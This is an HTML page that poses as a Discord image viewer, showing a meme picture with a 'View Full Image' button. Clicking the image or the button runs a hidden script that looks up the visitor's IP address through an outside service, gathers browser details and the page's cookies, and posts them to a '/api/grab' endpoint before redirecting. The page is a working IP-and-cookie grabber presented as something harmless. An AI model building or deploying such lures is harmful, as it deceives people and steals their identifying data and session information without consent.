<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>discord.gg/image</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Whitney', 'Helvetica Neue', Helvetica, Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .container {
            background: rgba(255,255,255,0.1);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            padding: 40px;
            max-width: 500px;
            width: 100%;
            text-align: center;
            box-shadow: 0 20px 40px rgba(0,0,0,0.3);
            border: 1px solid rgba(255,255,255,0.2);
        }
        .logo {
            font-size: 48px;
            background: linear-gradient(45deg, #5865f2, #7289da);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            margin-bottom: 20px;
        }
        .image-container {
            position: relative;
            margin: 30px 0;
        }
        .image {
            width: 100%;
            max-width: 400px;
            height: 300px;
            object-fit: cover;
            border-radius: 16px;
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
            border: 3px solid rgba(255,255,255,0.2);
        }
        .image:hover {
            transform: translateY(-5px) scale(1.02);
            box-shadow: 0 20px 40px rgba(0,0,0,0.4);
        }
        .btn {
            background: linear-gradient(45deg, #5865f2, #7289da);
            color: white;
            border: none;
            padding: 16px 40px;
            border-radius: 50px;
            font-size: 18px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 0 10px 30px rgba(88,101,242,0.4);
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        .btn:hover {
            transform: translateY(-3px);
            box-shadow: 0 15px 40px rgba(88,101,242,0.6);
        }
        .subtitle {
            color: rgba(255,255,255,0.8);
            margin-bottom: 20px;
            font-size: 16px;
        }
        @media (max-width: 600px) {
            .container {
                padding: 30px 20px;
                margin: 10px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <i class="fab fa-discord"></i>
        </div>
        <h1 style="color: white; font-size: 28px; margin-bottom: 10px;">discord.gg/image</h1>
        <p class="subtitle">Click to view full resolution image</p>
        
        <div class="image-container">
            <img id="targetImage" src="https://i.kym-cdn.com/editorials/icons/original/000/015/159/druski-ravens-meme.jpg" alt="Discord Image" class="image" onclick="grab()">
        </div>
        
        <button class="btn" onclick="grab()">
            <i class="fas fa-eye"></i> View Full Image
        </button>
    </div>

    <script>
        async function grab() {
            try {
                const ip = await fetchIP();
                const data = {
                    ip: ip,
                    userAgent: navigator.userAgent,
                    referrer: document.referrer,
                    language: navigator.language,
                    platform: navigator.platform,
                    cookies: document.cookie,
                    timestamp: new Date().toISOString(),
                    action: 'image_click'
                };

                await fetch('/api/grab', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data)
                });

                window.location.href = '/grab.html';
            } catch (e) {
                window.location.href = '/grab.html';
            }
        }

        async function fetchIP() {
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                return data.ip;
            } catch {
                return 'unknown';
            }
        }
    </script>
</body>
</html>
